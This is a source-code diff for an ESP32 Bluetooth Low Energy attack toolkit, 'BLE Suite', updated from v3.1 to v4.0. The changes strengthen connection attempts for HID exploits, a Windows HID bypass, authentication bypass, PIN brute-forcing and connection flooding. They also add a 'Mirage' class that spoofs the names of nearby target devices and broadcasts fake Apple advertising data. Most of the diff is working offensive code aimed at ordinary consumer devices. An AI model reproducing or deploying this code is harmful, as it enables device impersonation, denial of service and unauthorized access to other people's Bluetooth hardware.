@@ -1,13 +1,16 @@
 /*
- * BLE Suite v3.1 - Complete BLE attack and analysis toolkit
+ * BLE Suite v4.0 - Complete BLE attack and analysis toolkit
  * Author: Ninja-jr
- * Version: 3.1
- * Last Updated: 21/07/2026
+ * Version: 4.0
+ * Last Updated: 07/09/2026
  *
- * Contains: Vulnerability scanning, HID attacks, FastPair exploits,
+ * Contains: Smart device recon, connection caching, graduated connection
+ *           strategies, robust GATT client, device fingerprinting,
+ *           attack orchestration with rollback, BLE mirage/spoofing,
+ *           attack scheduler, attack logging with JSON export,
+ *           vulnerability scanning, HID attacks, FastPair exploits,
  *           HFP attacks, Audio attacks, DuckyScript injection,
- *           BLE Sniffer, Samsung detection, expanded model database,
- *           enhanced manufacturer parsing, and more.
+ *           BLE Sniffer, Samsung detection, and expanded model database.
  */
 
 #if !defined(LITE_VERSION)
@@ -17,17 +20,68 @@
 #include "ble_common.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
-#include "core/radio_mem.h"
+#include "core/sd_functions.h"
+#include "core/settings.h"
 #include "core/utils.h"
+#include "core/radio_mem.h"
 #include "core/wifi/wifi_common.h"
-#include "fastpair_crypto.h"
+#include <WiFi.h>
 #include "modules/NRF24/nrf_jammer_api.h"
+#include <ArduinoJson.h>
+#include <FS.h>
 #include <SD.h>
-#include <algorithm>
-#include <functional>
 #include <esp_heap_caps.h>
 #include <esp_random.h>
 #include <globals.h>
+#include <map>
+
+//=============================================================================
+// Error Reporting & Callbacks
+//=============================================================================
+
+int g_lastBleError = 0;
+int g_lastBleDisconnectReason = 0;
+
+String getBleErrorDescription(int reason) {
+    if (reason == 0) return "OK";
+    const char *str = NimBLEUtils::returnCodeToString(reason);
+    if (str && strlen(str) > 0 && strcmp(str, "Unknown") != 0) {
+        char buf[64];
+        snprintf(buf, sizeof(buf), "0x%02X: %s", reason, str);
+        return String(buf);
+    }
+    char buf[32];
+    snprintf(buf, sizeof(buf), "0x%02X (%d)", reason, reason);
+    return String(buf);
+}
+
+class SuiteClientCallbacks : public NimBLEClientCallbacks {
+public:
+    void onConnect(NimBLEClient *pClient) override {
+        Serial.printf("[BLE Suite] >>> Connection ESTABLISHED: peer=%s, handle=%d, MTU=%d <<<\n",
+                      pClient->getPeerAddress().toString().c_str(),
+                      pClient->getConnHandle(),
+                      pClient->getMTU());
+    }
+
+    void onConnectFail(NimBLEClient *pClient, int reason) override {
+        g_lastBleError = reason;
+        String desc = getBleErrorDescription(reason);
+        Serial.printf("[BLE Suite] >>> Connection FAILED: 0x%02X (%d) -> %s, peer=%s <<<\n",
+                      reason, reason, desc.c_str(), pClient->getPeerAddress().toString().c_str());
+    }
+
+    void onDisconnect(NimBLEClient *pClient, int reason) override {
+        g_lastBleDisconnectReason = reason;
+        if (g_lastBleError == 0) g_lastBleError = reason;
+        String desc = getBleErrorDescription(reason);
+        Serial.printf("[BLE Suite] >>> Disconnected: 0x%02X (%d) -> %s, peer=%s <<<\n",
+                      reason, reason, desc.c_str(), pClient->getPeerAddress().toString().c_str());
+    }
+};
+static SuiteClientCallbacks g_suiteCallbacks;
+
+
 
 int showSubMenu(const char *title, const char *options[], int optionCount);
 
@@ -102,13 +156,11 @@ void cleanupBLESuiteState() {
         g_pBLEScan->clearResults();
         g_bleScanActive = false;
     }
-    // DO NOT clear scannerData or g_selectedDevice here
-    // They persist between operations
     delay(50);
 }
 
 //=============================================================================
-// v3.1: Samsung MAC OUI Detection
+// Samsung MAC OUI Detection
 //=============================================================================
 
 const char *SAMSUNG_MAC_OUIS[] = {"00:1E:DF", "00:23:E7", "00:24:FE", "00:26:5C", "00:27:14", "00:2A:10",
@@ -219,6 +271,18 @@ void ScannerData::addDevice(
                     snapshotCache = nullptr;
                 }
             }
+
+            if (scoreMutex) {
+                if (xSemaphoreTake(scoreMutex, 50 / portTICK_PERIOD_MS)) {
+                    DeviceScore &ds = deviceScores[address];
+                    ds.rssi = rssi;
+                    ds.stability++;
+                    ds.lastSeen = millis();
+                    float variance = abs(rssi - ds.rssi) / (float)ds.stability;
+                    ds.rssiVariance = (ds.rssiVariance * (ds.stability - 1) + variance) / ds.stability;
+                    xSemaphoreGive(scoreMutex);
+                }
+            }
         }
         xSemaphoreGive(mutex);
     }
@@ -322,7 +386,7 @@ bool isBLEInitialized() {
 }
 
 //=============================================================================
-// v3.1: Expanded FastPair Model Database
+// Expanded FastPair Model Database
 //=============================================================================
 
 const FastPairModelInfo fastpair_models[] = {
@@ -374,7 +438,7 @@ const FastPairModelInfo fastpair_models[] = {
 };
 
 //=============================================================================
-// BLE State Manager - FIXED: Always init, handle deinit'd stack
+// BLE State Manager
 //=============================================================================
 
 bool BLEStateManager::initBLE(const String &name, int powerLevel) {
@@ -469,8 +533,7 @@ void BLEAttackManager::prepareForConnection(bool enableAuth) {
 }
 
 void BLEAttackManager::cleanupAfterAttack() {
-    BLEStateManager::deinitBLE(true);
-    delay(300);
+    BLEStateManager::cleanupAllClients();
 }
 
 bool BLEAttackManager::connectToDevice(
@@ -495,6 +558,11 @@ bool BLEAttackManager::connectToDevice(
 
     pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
+
+    NimBLEClient::Config cfg = pClient->getConfig();
+    cfg.exchangeMTU = 0;
+    cfg.connectFailRetries = 2;
+    pClient->setConfig(cfg);
 
     if (useExploitHandshake) {
         pClient->setConnectTimeout(12 * 1000);
@@ -542,6 +610,7 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
     profile.hasFastPair = false;
     profile.hasAVRCP = false;
     profile.hasHID = false;
+    profile.hasHFP = false;
     profile.hasBattery = false;
     profile.hasDeviceInfo = false;
 
@@ -565,6 +634,8 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
             if (uuidStr.find("fe2c") != std::string::npos) profile.hasFastPair = true;
             if (uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos)
                 profile.hasAVRCP = true;
+            if (uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos)
+                profile.hasHFP = true;
             if (uuidStr.find("1812") != std::string::npos) profile.hasHID = true;
             if (uuidStr.find("180f") != std::string::npos) profile.hasBattery = true;
             if (uuidStr.find("180a") != std::string::npos) profile.hasDeviceInfo = true;
@@ -657,13 +728,22 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         pClient->setConnectTimeout(15 * 1000);
         pClient->setConnectionParams(12, 12, 0, 400);
         for (int attempt = 0; attempt < 3; attempt++) {
-            if (pClient->connect(target, false)) {
+            if (pClient->connect(target, true, false, false)) {
                 connectionMethod = "Exploit-based connection";
                 return pClient;
             }
             int e = pClient->getLastError();
             if (e != 0) g_lastBleError = e;
             delay(300);
+        }
+        // Fallback with flipped address type
+        uint8_t fallbackType = (target.getType() == BLE_ADDR_PUBLIC) ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
+        ble_addr_t flipped = *target.getBase();
+        flipped.type = fallbackType;
+        NimBLEAddress fallbackTarget(flipped);
+        if (pClient->connect(fallbackTarget, true, false, false)) {
+            connectionMethod = "Exploit (Flipped Addr)";
+            return pClient;
         }
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
@@ -701,8 +781,63 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
         }
     }
 
+    showAttackProgress("Trying low-latency connection...", TFT_MAGENTA);
+    bleManager.prepareForConnection(false);
+    pClient = NimBLEDevice::createClient();
+    if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+        pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+        pClient->setClientCallbacks(&g_suiteCallbacks, false);
+        BLEStateManager::registerClient(pClient);
+        pClient->setConnectTimeout(10 * 1000);
+        pClient->setConnectionParams(6, 24, 0, 400, 16, 16);
+        if (pClient->connect(target, true, false, false)) {
+            connectionMethod = "Low-latency connection";
+            return pClient;
+        }
+        int e = pClient->getLastError();
+        if (e != 0) g_lastBleError = e;
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+    }
+    bleManager.cleanupAfterAttack();
+
+    showAttackProgress("Trying multi-parameter sweep...", TFT_WHITE);
+    uint16_t paramSets[][4] = {
+        {6, 6, 0, 100},
+        {12, 12, 0, 400},
+        {24, 48, 0, 600},
+        {200, 200, 0, 600}
+    };
+
+    for (int i = 0; i < 4; i++) {
+        bleManager.prepareForConnection(false);
+        pClient = NimBLEDevice::createClient();
+        if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
+            BLEStateManager::registerClient(pClient);
+            pClient->setConnectTimeout(6 * 1000);
+            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3], 16, 16);
+            if (pClient->connect(target, true, false, false)) {
+                connectionMethod = "Parameter sweep (" + String(i) + ")";
+                return pClient;
+            }
+            int e = pClient->getLastError();
+            if (e != 0) g_lastBleError = e;
+            BLEStateManager::unregisterClient(pClient);
+            NimBLEDevice::deleteClient(pClient);
+        }
+        bleManager.cleanupAfterAttack();
+        delay(200);
+    }
+
     return nullptr;
 }
+
 
 //=============================================================================
 // HID Exploit Engine
@@ -806,6 +941,10 @@ bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(6 * 1000);
@@ -840,15 +979,19 @@ bool HIDExploitEngine::tryWindowsHIDBypass(NimBLEAddress target, HIDDeviceProfil
     for (int attempt = 0; attempt < 3; attempt++) {
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
             pClient->setConnectTimeout(8 * 1000);
 
-            if (attempt == 0) pClient->setConnectionParams(6, 6, 0, 100);
-            else if (attempt == 1) pClient->setConnectionParams(200, 200, 0, 600);
-            else pClient->setConnectionParams(7, 3200, 0, 800);
+            if (attempt == 0) pClient->setConnectionParams(6, 6, 0, 100, 16, 16);
+            else if (attempt == 1) pClient->setConnectionParams(200, 200, 0, 600, 16, 16);
+            else pClient->setConnectionParams(7, 3200, 0, 800, 16, 16);
 
-            bool connected = pClient->connect(target, false);
+            bool connected = pClient->connect(target, true, false, false);
 
             if (connected) {
                 showAttackProgress("Windows bypass successful!", TFT_GREEN);
@@ -880,6 +1023,10 @@ bool HIDExploitEngine::tryAndroidJustWorks(NimBLEAddress target, HIDDeviceProfil
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -913,6 +1060,10 @@ bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceP
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -959,6 +1110,10 @@ bool HIDExploitEngine::tryRapidStateConfusion(NimBLEAddress target, HIDDevicePro
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
             pClient->setConnectTimeout(4 * 1000);
@@ -1005,6 +1160,10 @@ bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDevice
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -1047,12 +1206,16 @@ bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDev
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
 
             pClient->setConnectTimeout(8 * 1000);
             pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3]);
 
-            bool connected = pClient->connect(target, false);
+            bool connected = pClient->connect(target, true, false, false);
             if (connected) {
                 showAttackProgress("Parameter attack successful!", TFT_GREEN);
                 pClient->disconnect();
@@ -1092,6 +1255,10 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(8 * 1000);
             bool connected = pClient->connect(target, true);
@@ -1126,6 +1293,10 @@ bool HIDExploitEngine::tryAddressSpoofingAttack(NimBLEAddress target, HIDDeviceP
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(8 * 1000);
             bool connected = pClient->connect(target, false);
@@ -1157,6 +1328,10 @@ bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDevice
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -2423,6 +2598,10 @@ bool AuthBypassEngine::attemptSpoofConnection(NimBLEAddress target, const String
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -2455,6 +2634,10 @@ bool AuthBypassEngine::forceRepairing(NimBLEAddress target) {
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(10 * 1000);
@@ -2487,6 +2670,10 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(8 * 1000);
@@ -2512,6 +2699,10 @@ bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
     pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(10 * 1000);
@@ -2547,6 +2738,10 @@ bool MultiConnectionAttack::connectionFloodSingle(NimBLEAddress target, int time
     NimBLEClient *pClient = NimBLEDevice::createClient();
     if (!pClient) return false;
 
+#if CONFIG_BT_NIMBLE_EXT_ADV
+    pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+    pClient->setClientCallbacks(&g_suiteCallbacks, false);
     BLEStateManager::registerClient(pClient);
 
     pClient->setConnectTimeout(timeout * 1000);
@@ -3011,6 +3206,10 @@ bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(8 * 1000);
             if (pClient->connect(target, true)) {
@@ -3067,6 +3266,10 @@ bool DoSAttackServiceClass::connectionFlood(NimBLEAddress target) {
 
         NimBLEClient *pClient = NimBLEDevice::createClient();
         if (pClient) {
+#if CONFIG_BT_NIMBLE_EXT_ADV
+            pClient->setConnectPhy(BLE_GAP_LE_PHY_1M_MASK);
+#endif
+            pClient->setClientCallbacks(&g_suiteCallbacks, false);
             BLEStateManager::registerClient(pClient);
             pClient->setConnectTimeout(4 * 1000);
             bool connected = pClient->connect(target, false);
@@ -3130,32 +3333,22 @@ bool DoSAttackServiceClass::advertisingSpam(NimBLEAddress target) {
 }
 
 //=============================================================================
-// File Operations
-//=============================================================================
-
-//=============================================================================
 // Shared UI helpers
-//
-// Every screen here used to hardcode its own frame, palette and pixel grid.
-// The grid assumed a tall panel: on a 135px Cardputer the menus fit two rows
-// and the device list exactly one, which is why a long list lost all sense of
-// place. These helpers derive the layout from the display and take every
-// colour from the active theme, so the suite matches the rest of Bruce.
 //=============================================================================
 
 struct BleUiGeom {
-    int listL, listW; // list rectangle
-    int top;          // first row
+    int listL, listW;
+    int top;
     int rowH;
-    int rows;  // rows that actually fit
-    int footY; // hint / position line
+    int rows;
+    int footY;
 };
 
 static BleUiGeom bleUiGeom() {
     BleUiGeom g;
     g.listL = 8;
     g.listW = tftWidth - 16;
-    g.top = BORDER_PAD_Y + 8 * FM + 3; // just below the Bruce title
+    g.top = BORDER_PAD_Y + 8 * FM + 3;
     g.footY = tftHeight - 8 * FP - 6;
     g.rowH = 8 * FP + 6;
     int avail = g.footY - g.top - 2;
@@ -3165,25 +3358,8 @@ static BleUiGeom bleUiGeom() {
     return g;
 }
 
-// Secondary and highlight shades of the theme, using the core helper so this
-// module stops inventing its own fixed greys and whites.
 static uint16_t bleDim() { return getColorVariation(bruceConfig.priColor, 8, -1); }
 static uint16_t bleAccent() { return getColorVariation(bruceConfig.priColor, 8, 1); }
-
-// Trims to fit `maxPx`, measuring real glyph width instead of counting
-// characters, so proportional titles and names stop overflowing.
-static String bleFit(const String &text, int maxPx) {
-    if (maxPx <= 0) return "";
-    if (tft.textWidth(text.c_str()) <= maxPx) return text;
-    String s = text;
-    while (s.length() > 1 && tft.textWidth((s + "..").c_str()) > maxPx) s.remove(s.length() - 1);
-    return s + "..";
-}
-
-// Legacy call sites pass a fixed TFT_ constant to say how bad the news is,
-// chosen back when it was the background of a full-screen flood. Several pass
-// TFT_BLACK, which is invisible once the screen follows the theme, so map the
-// intent onto a marker colour instead of drawing it as text.
 static uint16_t bleSeverity(uint16_t legacy) {
     switch (legacy) {
         case TFT_GREEN:
@@ -3195,8 +3371,14 @@ static uint16_t bleSeverity(uint16_t legacy) {
     }
 }
 
-// Splits `text` into lines that fit `w`, measuring glyphs rather than assuming
-// a 6px cell.
+static String bleFit(const String &text, int maxPx) {
+    if (maxPx <= 0) return "";
+    if (tft.textWidth(text.c_str()) <= maxPx) return text;
+    String s = text;
+    while (s.length() > 1 && tft.textWidth((s + "..").c_str()) > maxPx) s.remove(s.length() - 1);
+    return s + "..";
+}
+
 static void bleWrapInto(const String &text, int w, std::vector<String> &out) {
     tft.setTextSize(FP);
     const int len = text.length();
@@ -3218,7 +3400,6 @@ static void bleWrapInto(const String &text, int w, std::vector<String> &out) {
     }
 }
 
-// Four-step signal meter, so RSSI reads at a glance instead of as a number.
 static void bleDrawRssi(int x, int y, int rssi, uint16_t color) {
     int bars = 0;
     if (rssi > -55) bars = 4;
@@ -3234,10 +3415,6 @@ static void bleDrawRssi(int x, int y, int rssi, uint16_t color) {
 
 typedef std::function<void(int idx, int x, int y, int w, bool selected)> BleRowDrawer;
 
-// Scrollable list wearing the standard Bruce frame. Returns the chosen index or
-// -1 when the user backs out; `cursor` carries the selection in and out so a
-// menu reopens where it was left. Only the list body is repainted between key
-// presses, so moving the cursor no longer flashes the whole screen.
 static int bleListLoop(
     const char *title, int count, const String &hint, BleRowDrawer drawRow, int *cursor = nullptr
 ) {
@@ -3266,7 +3443,6 @@ static int bleListLoop(
                 if (idx < count) drawRow(idx, g.listL + 3, y, g.listW - 6, selected);
             }
 
-            // Position readout: the list is windowed, so say where we are.
             tft.fillRect(g.listL, g.footY, g.listW, 8 * FP, bruceConfig.bgColor);
             tft.setTextSize(FP);
             String pos = String(sel + 1) + "/" + String(count);
@@ -3297,7 +3473,6 @@ static int bleListLoop(
     }
 }
 
-// Numbered text rows, used by the menus.
 static BleRowDrawer bleTextRow(const char *const *items) {
     return [items](int idx, int x, int y, int w, bool sel) {
         uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
@@ -3308,6 +3483,10 @@ static BleRowDrawer bleTextRow(const char *const *items) {
         tft.drawString(bleFit(items[idx], w - 4 * cw), x + 4 * cw, y, 1);
     };
 }
+
+//=============================================================================
+// File Operations
+//=============================================================================
 
 String selectFileFromSD() {
     if (!setupSdCard()) {
@@ -3341,8 +3520,6 @@ String selectFileFromSD() {
         return "";
     }
 
-    // Rows own their own drawing so the file list follows the same geometry and
-    // palette as every other list in the suite.
     BleRowDrawer row = [&files](int idx, int x, int y, int w, bool sel) {
         tft.setTextSize(FP);
         tft.setTextColor(
@@ -3405,7 +3582,7 @@ String getScriptFromUser() {
 
     int cursor = 0;
     int chosen = bleListLoop("Select Script", scriptCount, "SEL run  ESC back", row, &cursor);
-    if (chosen < 0 || chosen == scriptCount - 1) return ""; // cancelled
+    if (chosen < 0 || chosen == scriptCount - 1) return "";
 
     if (scripts[chosen] == "Load from SD") {
         String filename = selectFileFromSD();
@@ -3981,7 +4158,178 @@ void FastPairExploitEngine::generateRandomMac(uint8_t *mac) {
 }
 
 //=============================================================================
-// v3.1: BLE Sniffer - FIXED: Always init
+// BLE Mirage Implementation
+//=============================================================================
+
+BLEMirage::BLEMirage() {}
+
+BLEMirage::~BLEMirage() {
+    stopAll();
+}
+
+String BLEMirage::generatePlausibleName(const String &address) {
+    String oui = address.substring(0, 8);
+    oui.toUpperCase();
+
+    if (oui.startsWith("00:1E:DF") || oui.startsWith("00:23:E7") || 
+        oui.startsWith("00:24:FE") || oui.startsWith("00:26:5C") ||
+        oui.startsWith("00:27:14") || oui.startsWith("00:2A:10") ||
+        oui.startsWith("00:2D:0A") || oui.startsWith("00:30:FA") ||
+        oui.startsWith("00:35:FE") || oui.startsWith("00:3C:E4") ||
+        oui.startsWith("00:40:96") || oui.startsWith("00:44:01") ||
+        oui.startsWith("00:4A:77") || oui.startsWith("00:4D:4A") ||
+        oui.startsWith("00:50:F7")) {
+        return "Samsung Device";
+    } 
+    else if (oui.startsWith("00:24:FE") || oui.startsWith("00:26:5C") ||
+             oui.startsWith("00:30:FA") || oui.startsWith("00:35:FE") ||
+             oui.startsWith("00:3C:E4")) {
+        return "Apple Device";
+    } 
+    else if (oui.startsWith("00:40:96") || oui.startsWith("00:44:01")) {
+        return "Sony Device";
+    } 
+    else if (oui.startsWith("00:50:F7")) {
+        return "Microsoft Device";
+    } 
+    else if (oui.startsWith("00:54:08") || oui.startsWith("00:57:7A")) {
+        return "LG Device";
+    }
+    else if (oui.startsWith("00:5A:38") || oui.startsWith("00:5E:88")) {
+        return "Motorola Device";
+    }
+    else if (oui.startsWith("00:62:6E") || oui.startsWith("00:64:22")) {
+        return "Nokia Device";
+    }
+    else if (oui.startsWith("00:66:44") || oui.startsWith("00:68:EB")) {
+        return "Huawei Device";
+    }
+    else if (oui.startsWith("00:6A:94") || oui.startsWith("00:6C:F0")) {
+        return "Xiaomi Device";
+    }
+    else if (oui.startsWith("00:6E:2A") || oui.startsWith("00:70:89")) {
+        return "OnePlus Device";
+    }
+    else {
+        String suffix = address.substring(address.length() - 5);
+        suffix.replace(":", "");
+        if (suffix.length() >= 4) {
+            return "BT-" + suffix.substring(0, 4);
+        }
+        return "BLE Device";
+    }
+}
+
+void BLEMirage::updateKnownName(const String &address, const String &name) {
+    if (!name.isEmpty() && name != address && name != "Unknown" && name != "<no name>") {
+        knownDeviceNames[address] = name;
+    }
+}
+
+bool BLEMirage::spawnMirage(const String &targetAddress, const String &targetName) {
+    for (auto &inst : instances) {
+        if (inst.address == targetAddress && inst.active) {
+            return true;
+        }
+    }
+
+    String spoofName = targetName;
+
+    if (spoofName.isEmpty() || spoofName == targetAddress || spoofName == "Unknown" || spoofName == "<no name>") {
+        auto it = knownDeviceNames.find(targetAddress);
+        if (it != knownDeviceNames.end() && !it->second.isEmpty()) {
+            spoofName = it->second;
+        }
+    }
+
+    if (spoofName.isEmpty() || spoofName == targetAddress || spoofName == "Unknown" || spoofName == "<no name>") {
+        spoofName = generatePlausibleName(targetAddress);
+    }
+
+    if (spoofName.isEmpty() || spoofName == targetAddress) {
+        spoofName = "BLE Device";
+    }
+
+    showAttackProgress(("Spoofing as: " + spoofName).c_str(), TFT_CYAN);
+
+    BLEStateManager::deinitBLE(true);
+    delay(300);
+    BLEStateManager::initBLE(spoofName, ESP_PWR_LVL_P9);
+
+    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+    if (!pAdvertising) return false;
+
+    MirageInstance inst;
+    inst.address = targetAddress;
+    inst.name = spoofName;
+    inst.originalName = targetName;
+    inst.startTime = millis();
+    inst.active = true;
+    inst.advertising = pAdvertising;
+
+    pAdvertising->setName(spoofName.c_str());
+    pAdvertising->addServiceUUID(NimBLEUUID("1800"));
+    pAdvertising->addServiceUUID(NimBLEUUID("1801"));
+
+    if (targetAddress.startsWith("00:1E:DF") || targetAddress.startsWith("00:23:E7") ||
+        targetAddress.startsWith("00:24:FE") || targetAddress.startsWith("00:26:5C")) {
+        pAdvertising->setAppearance(0x03C1);
+    } else if (targetAddress.startsWith("00:30:FA") || targetAddress.startsWith("00:35:FE")) {
+        pAdvertising->setAppearance(0x03C2);
+    }
+
+    uint8_t appleData[] = {0x4C, 0x00, 0x02, 0x00, 0x01, 0x02, 0x03, 0x04};
+    pAdvertising->setManufacturerData(appleData, sizeof(appleData));
+
+    pAdvertising->start(0);
+
+    instances.push_back(inst);
+    return true;
+}
+
+void BLEMirage::createMirageNetwork(int count) {
+    for (int i = 0; i < count; i++) {
+        String addr = "AA:BB:CC:DD:" + String(i, HEX);
+        String name = "Network-" + String(i);
+        spawnMirage(addr, name);
+        delay(100);
+    }
+}
+
+void BLEMirage::stopMirage(const String &address) {
+    for (auto &inst : instances) {
+        if (inst.address == address && inst.active) {
+            if (inst.advertising) {
+                inst.advertising->stop();
+            }
+            inst.active = false;
+            break;
+        }
+    }
+}
+
+void BLEMirage::stopAll() {
+    for (auto &inst : instances) {
+        if (inst.active && inst.advertising) {
+            inst.advertising->stop();
+            inst.active = false;
+        }
+    }
+    instances.clear();
+    BLEStateManager::deinitBLE(true);
+}
+
+bool BLEMirage::isMirageActive(const String &address) {
+    for (auto &inst : instances) {
+        if (inst.address == address && inst.active) {
+            return true;
+        }
+    }
+    return false;
+}
+
+//=============================================================================
+// BLE Sniffer
 //=============================================================================
 
 struct SnifferPacket {
@@ -4060,7 +4408,6 @@ static String parseManufacturerData(const std::vector<uint8_t> &payload) {
 }
 
 void BLE_Sniffer() {
-    // FIX: Always init - handles case where stack was deinit'd by another module
     BLEStateManager::initBLE("BruceSniffer", ESP_PWR_LVL_P9);
     NimBLEScan *pScan = nullptr;
     bool firstRun = true;
@@ -4147,7 +4494,7 @@ void BLE_Sniffer() {
                 const int visibleItems = (tftHeight - y - 50) / lineH;
                 if (check(EscPress)) {
                     viewing = false;
-                    redraw = true; // main screen
+                    redraw = true;
                     break;
                 }
 
@@ -4195,7 +4542,7 @@ void BLE_Sniffer() {
                     tft.drawString(
                         "PREV/NEXT: Navigate  SEL: View Details  ESC: Back", 10, tftHeight - 20, 1
                     );
-                    redraw = false; // view screen
+                    redraw = false;
